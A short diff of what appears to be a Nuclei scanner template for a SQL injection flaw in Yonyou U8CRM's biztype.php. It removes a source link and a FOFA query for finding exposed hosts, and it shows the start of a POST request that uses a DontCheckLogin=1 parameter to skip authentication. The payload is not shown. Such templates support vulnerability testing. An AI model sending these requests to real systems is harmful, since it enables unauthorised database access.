@@ -3,12 +3,8 @@ info:
   name: 用友U8CRM biztype.php sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dm7qdtvyqffb92na'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dm7qdtvyqffb92na
-    fofa: title="用友U8CRM"
 http:
 - raw:
   - 'POST /activity/biztype.php?DontCheckLogin=1 HTTP/1.1
